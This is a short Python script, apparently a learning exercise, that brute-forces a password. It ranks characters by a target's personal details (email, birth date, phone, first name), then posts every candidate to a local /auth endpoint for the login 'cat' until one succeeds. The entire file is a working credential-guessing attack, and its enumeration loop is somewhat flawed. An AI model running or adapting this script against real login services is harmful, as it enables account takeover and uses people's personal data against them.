import requests
import string

# alphabet = '0123456789abcdefghijklmnopqrstuvwxyz'
#заполняем наш "алфавит", добавляя стандартные веса для вхожджений
alphabet_dict = {}
for ch in string.printable:
    alphabet_dict[ch] = 0.5

email = 'test@gmail.com'
birth_date = '20.02.1990'
phone = '89076543709'
name = 'Ivan'

for c in email:
    alphabet_dict[c] += .1

for c in birth_date:
    alphabet_dict[c] += .1

for c in phone:
    alphabet_dict[c] += .1

for c in name:
    alphabet_dict[c] += .1


sorted_alphabet_dict = {k: v for k, v in sorted(alphabet_dict.items(), key=lambda item: item[1], reverse=True)}
alphabet = "".join(sorted_alphabet_dict.keys())
print(alphabet)
base = len(alphabet)


i = 0
length = 0

while True:

    result = ''
    temp = i
    while temp > 0:
        rest = temp % base  # остаток от деления
        result = alphabet[rest] + result
        temp = temp // base  # целочисленное деление

    while len(result) < length:
        result = '0' + result

    data = {'login': 'cat', 'password': result}
    response = requests.post('http://127.0.0.1:5000/auth', json=data)
    if response.status_code == 200:
        print('SUCCESS!', result)
        break

    if result == 'z' * length:
        length += 1
        i = 0
    else:
        i += 1

    
